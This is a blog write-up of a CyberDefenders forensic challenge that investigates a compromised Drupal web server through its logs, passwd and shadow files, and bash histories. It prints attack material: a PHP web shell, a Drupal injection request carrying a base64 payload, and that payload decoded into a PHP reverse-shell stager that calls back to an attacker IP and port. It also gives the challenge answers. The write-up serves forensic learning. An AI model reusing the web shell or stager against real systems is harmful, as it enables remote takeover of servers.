---
title: "Cyberdefenders · Digital Forensic · Hacked"
date: 2023-08-12T11:20:47+03:00
draft: false
---

The scenario:

> A soc analyst has been called to analyze a compromised Linux web server. Figure out how the threat actor gained access, what modifications were applied to the system, and what persistent techniques were utilized. (e.g. backdoors, users, sessions, etc).

![Drupal CMS illustration.](/img/write-up/hacked/drupal.png)

<figcaption>Drupal CMS illustration.</figcaption>

## Abstract

This article revolves around the investigation of a compromised Linux web server by a SOC analyst. The key objectives are to determine how the threat actor gained access, identify system modifications, and uncover persistent techniques used, including backdoors and user manipulation. The article explores various methods and tools for extracting crucial information, such as system logs, password files, user activities, and system configurations. 

It delves into examining timestamps, authentication attacks, user creations, privilege escalation, and exploitation attempts. The analysis reveals the CMS version, attacker's reverse shell, deleted files, and more, providing valuable insights into the incident response process for compromised Linux systems.

## Q1. What is the system timezone? 

We can see this information here: `/etc/timezone`.

## Q2. Who was the last user to log in to the system? 

The interesting file is `var/log/wtmp`, as this file is encoded, you can not display its content. To read it you can use this command:

```bash
last -f var/log/wtmp

mail     pts/1        192.168.210.131  Sat Oct  5 14:23 - 14:24  (00:00)
```

## Q3. What was the source port the user 'mail' connected from?

Let's check logs file: `var/log/auth.log` search for 'mail' and the latest entry (most recent one).

```logs
Oct  5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2
```

## Q4. How long was the last session for user 'mail'? (Minutes only)

You can have this information with the same command as Q2. We can see that the connection begun at 14:23 and ended at 14:24.

```
last -f wtmp

mail     pts/1        192.168.210.131  Sat Oct  5 14:23 - 14:24  (00:00)
```

## Q5. Which server service did the last user use to log in to the system? 

You have the service name in the Q3: `sshd`.

## Q6. What type of authentication attack was performed against the target machine?

Searching the differences between `wtmp` and `btmp`, I found that `btmp` keep track of failed login attempts. Using `last -f var/log/btmp`, you can see **many** failed attempts, I "piped" it with `grep -c` (counting results) and the command returns 1298 results. It's kind of brute-force.

## Q7. How many IP addresses are listed in the '/var/log/lastlog' file?

You can use `strings` on `lastlog`, or an other way is to use this Python tool: [Lastlogcsv](https://pypi.org/project/lastlogcsv/):

```bash
python3 -m lastlogcsv -i lastlog -o lastlog.csv
```

The tool will convert lastlog into a csv file.

## Q8. How many users have a login shell?

An interesting file to read for users informations is `etc/passwd`. To understand it, I found this article from Linux Handbook: [What is Login Shell in Linux?](https://linuxhandbook.com/login-shell). To summarize, there is an usefull images from the article. Please take a look, we will need it for following questions:

![etc/passwd explaination](/img/write-up/hacked/etc-passwd-file-explained.png)

<figcaption>etc/passwd explaination</figcaption>

If an user has a login shell, the last column must be `/bin/bash`. To count the number of user who have a login shell I used:

```bash
grep -c '/bin/bash' etc/passwd

5
```

## Q9. What is the password of the mail user?

The file `etc/shadow` contains password informations about users passwords. The first column is the user name and the following one is the hashed password. **But this is not only the hashed password**, according to this site: [/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes](https://www.baeldung.com/linux/shadow-passwords), `$6$` means that the password was hashed with `SHA-512`.

```logs
mail:$6$zLaoLV8N$BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.:18174:0:99999:7:::
```

Using programs like John The Ripper or Hashcat, you will retrieve the mail's password, which is forensics.

## Q10. Which user account was created by the attacker?

I searched on internet regarding user creation logs and I found this topic: [Where can I find logs regarding the user creation?](https://askubuntu.com/questions/181357/where-can-i-find-logs-regarding-the-user-creation). The point is to check `/var/log/auth.log` and search on `useradd` command. We can see that the `root` user (previously brute-forced) created a user named `php` and add it to the `sudo` group.

```logs
Oct  5 13:06:38 VulnOSv2 sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -d /usr/php -m --system --shell /bin/bash --skel /etc/skel -G sudo php
Oct  5 13:06:38 VulnOSv2 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new group: name=php, GID=999
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new user: name=php, UID=999, GID=999, home=/usr/php, shell=/bin/bash
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add 'php' to group 'sudo'
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add 'php' to shadow group 'sudo'
```

## Q11. How many user groups exist on the machine?

User group informations are stored in `etc/group` file, each line is a user group and the file has lines 58 lines.

## Q12. How many users have sudo access?

Sudo access means that an user is in the `sudo` group. Display the `sudo` group line in `etc/group` and you will see all the user in this group.

```bash
$ grep 'sudo' etc/group

sudo:x:27:php,mail
```

## Q13. What is the home directory of the PHP user?

This kind of information can be found inside the `etc/passwd` file:

```
php:x:999:999::/usr/php:/bin/bash
```

Columns are delimited by the `:` symbol. You will easily find online the meaning of each, for us what is important is the first and the penultimate one, which are the username and the user home directory.

## Q14. What command did the attacker use to gain root privilege?

Command history are located in `~/.bash_history` where `~/` means the user's home directory. Thanks to the previous questions, we know that the attacker compromissed the `mail` user so we have to know where the `mail`'s home directory is. I used the same file as the previous question and found how the attackers gained root privilege.

```bash
$ grep 'mail' etc/passwd

mail:x:8:8:mail:/var/mail:/bin/bash

---

$ cat /var/mail/.bash_history

sudo su -
...
```

## Q15. Which file did the user 'root' delete?

This information must be logged into root's `~/.bash_history` file. Like the previous question, let's find the root's home directory in `etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
...
```

Into `root` we find the bash history file and it contains one interesting line:

```bash
rm 37292.c
```

## Q16. Recover the deleted file, open it and extract the exploit author name.

I didn't made this question, I downloaded `foremost` but as my current computer is very old and without many RAM, the program don't wanted to start. You have to use a recovery tool like `foremost` or `scalpel`.

## Q17. What is the content management system (CMS) installed on the machine?

First, I tought it was a Wordpress, because of the `php`, `mysql` and `phpmyadmin` directories in `etc/`. I searched on `etc/apache2/sites-available` and found this line in `000-default.conf` file:

```
DocumentRoot /var/www/html
```

Note that this location is a common one for website. This is the website's files location, in this directory I opened `/var/www/jabc/index.php`, without finding the solution. In fact, it was written under my eyes, but I didn't noticed it!

```php
<?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
```

I continued my research, I opened `var/html/www/jabc/.htaccess` which is a shortcut, my OS told me:

> Unable to access the given target: `/etc/drupal/7/htaccess` because it does not exists.

Which is normal as I mounted this drive, the shortcuts will not work anymore. But now I have the file path, intrigued by "grupal", I opened the `htaccess` file:

```
#
# Apache/PHP/Drupal settings:
#
...
```

Searching for what is Drupal gave me the answer, it's an open source CMS!

## Q18. What is the version of the CMS installed on the machine?

The exact version number is quite hidden. I searched in some of the config files but couldn't find the exact version number. I finaly tried to explore the themes files, supposing that the exact version number may displayed to compatibility reasons, I was true! Open `var/www/html/jabc/themes/bartik/bartik.info`:

```
; Information added by Drupal.org packaging script on 2014-01-15
version = "7.26"
project = "drupal"
datestamp = "1389815930"
```

## Q19. Which port was listening to receive the attacker's reverse shell?

Firstly, I searched what the attacker did, thanks the Q15, we have the root's user home directory and so its `.bash_history` file. You could read this:

```bash
cd /var/www/html/
ll
cd jabc
ll
cat .htaccess 
ll
vim scripts/update.php
ls -lh scripts/
w
logout 
```

The user go to `var/www/html/jabc/` and create or modify `update.php` and logout. Let's open this file:

```php
<?php
system($_GET['cmd']);
?>
```

If you don't know PHP, this line means that the system will execute the string passed into the URL variable `cmd`. **This is a reverse shell.**

For example an user go on this page: `<base url>/update.php?cmd=ls` the PHP script will execute `system('ls')`, which is basically a command line prompt, and so, a backdoor. 

In `var/log/access.log`, the user we can see that an user uses this backdoor (last line):

```log
192.168.210.131 - - [05/Oct/2019:13:17:54 +0200] "GET /jabc/scripts/update.php?cmd=ls HTTP/1.1" 200 244 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
```

More interesting, we can see a more offensive access:

```
192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b&name%5b%23type%5d=markup HTTP/1.1" 200 13983 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=file/ajax/name/%23value/form-tggMqwbT3cRyS3SWuIRNGj_FB_5N-cux23-NHVF0NrA HTTP/1.1" 200 1977 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
```

There is a base64 encoded payloads, let's decode it:

```php
/*<?php
/**/ error_reporting(0);
$ip = "192.168.210.131";
$port = 4444;
if (($f = "stream_socket_client") && is_callable($f)) {
    $s = $f("tcp://{$ip}:{$port}");
    $s_type = "stream";
}
if (!$s && ($f = "fsockopen") && is_callable($f)) {
    $s = $f($ip, $port);
    $s_type = "stream";
}
if (!$s && ($f = "socket_create") && is_callable($f)) {
    $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
    $res = @socket_connect($s, $ip, $port);
    if (!$res) {
        die();
    }
    $s_type = "socket";
}
if (!$s_type) {
    die("no socket funcs");
}
if (!$s) {
    die("no socket");
}
switch ($s_type) {
    case "stream":
        $len = fread($s, 4);
        break;
    case "socket":
        $len = socket_read($s, 4);
        break;
}
if (!$len) {
    die();
}
$a = unpack("Nlen", $len);
$len = $a["len"];
$b = "";
while (strlen($b) < $len) {
    switch ($s_type) {
        case "stream":
            $b .= fread($s, $len - strlen($b));
            break;
        case "socket":
            $b .= socket_read($s, $len - strlen($b));
            break;
    }
}
$GLOBALS["msgsock"] = $s;
$GLOBALS["msgsock_type"] = $s_type;
if (extension_loaded("suhosin") && ini_get("suhosin.executor.disable_eval")) {
    $suhosin_bypass = create_function("", $b);
    $suhosin_bypass();
} else {
    eval($b);
}
die();
```

Let's use ChatGPT to explain this code:

1. Disables error reporting using `error_reporting(0)`.

2. Tries to create a stream connection with the specified IP address and port using different available functions. The tested functions are: `stream_socket_client`, `fsockopen`, and `socket_create`.

3. If the connection fails with all tested functions, the script terminates by displaying "no socket funcs" or "no socket," depending on the case.

4. If a connection succeeds, the script reads the first 4 bytes from the connection, which are assumed to represent the length of the data to receive.

5. The data is then read from the connection in several steps to reach the total length indicated by the initial 4 bytes.

6. Once the complete data is read, the evaluated code is executed using the eval function.

7. Before executing the evaluated code, the code checks if the "suhosin" extension is loaded and if the "suhosin.executor.disable_eval" configuration is enabled. If so, the code dynamically creates a function to bypass this restriction.

8. The code terminates after executing the evaluated code.

mode GPT off.

Le 'evaluated code' is the socket content; what the attackers wants to execute remotely. In this code we have the port used by the attacker!

